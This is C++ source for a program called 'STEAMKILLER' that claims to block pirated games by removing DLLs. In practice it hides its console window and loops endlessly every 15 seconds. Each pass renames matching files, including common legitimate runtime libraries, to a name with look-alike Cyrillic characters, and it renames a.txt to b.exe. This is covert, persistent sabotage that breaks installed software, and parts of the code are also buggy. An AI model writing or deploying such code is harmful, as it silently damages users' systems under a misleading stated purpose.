/*
===============================STEAMKILLER=========================================

__DEVELOPER__VERSION__

This is a program to stop pirated games by simply removing some of these files..

steamapi.dll
steam_api64.dll
steamclient.dll
binkw.dll
binkw32.dll
bink2w64.dll
vulkan-1.dll
UnityPlayer.dll
msvcp140.dll

===================================================================================
*/

// #include<ftw.h>
// #include<dirent.h>
// these are old methods

//#include <experimental/filesystem>

// some macros declarations .. (this was stupid...)
#define ISEQUALTO(x, y) x == y ? true : false

#include <string>
#include <iostream>
#include <windows.h>
#include <wincon.h>
#include <winuser.h>
#include <filesystem.hpp>

namespace fs = ghc::filesystem;

// global variables declarations ... ѕtеаm
std::vector<std::__cxx11::string> toDelete = {"\\steamapi.dll", "\\steam_api64.dll",
                                              "\\steamclient.dll", "\\binkw.dll",
                                              "\\binkw32.dll", "\\bink2w64.dll",
                                              "\\vulkan-1.dll", "\\UnityPlayer.dll",
                                              "\\msvcp140.dll", "\\b.txt"};

std::vector<std::__cxx11::string> renamedFileNames = {"\\ѕtеаm_api64.dll"};

// helping functions
boolean
removeCrackFiles(std::vector<ghc::filesystem::path> fileList)
{
    std::cout << "Files Removal process ..";
    for (auto &&i : fileList)
    {
        for (auto &&j : toDelete)
        {
            // old plan
            // if (i == j){auto confirmation = ghc::filesystem::remove(i);}
            std::string tempstr = i.u8string();
            size_t fileNamePos = tempstr.find(j);
            if (fileNamePos != std::string::npos)
            {
                std::cout << "found";
                tempstr.replace(fileNamePos, 17, renamedFileNames[0]);
                ghc::filesystem::rename(i, tempstr);
            }
        }
    }
}
std::vector<ghc::filesystem::path>
directoryScanner(fs::path currentDirName)
{
    size_t j = 1;
    std::vector<ghc::filesystem::path> fileList;
    for (const auto &entry : fs::recursive_directory_iterator(currentDirName))
    {
        std::cout << entry.path() << std::endl;
        std::cout << "Ran time:" << j++;
        fileList.push_back(entry.path());
    }
    return fileList;
}
int main(int argc, char const *argv[])
{
    ShowWindow(FindWindowA("ConsoleWindowClass", NULL), false);
    FreeConsole();
    do
    {
        std::error_code ec;
        // if ec is system:5 it means file can't be renamed
        // if ec is system:2 it means file do not exixst to rename

        fs::path pwd = ".";
        // std::string string = pwd.u8string();

        auto allFilesPath = directoryScanner(pwd);
        ghc::filesystem::rename(".\\a.txt", ".\\b.exe", ec);
        std::cout << ec;
        removeCrackFiles(allFilesPath);
        Sleep(15000); // 15000 ms
    } while (true);
    return 0;
}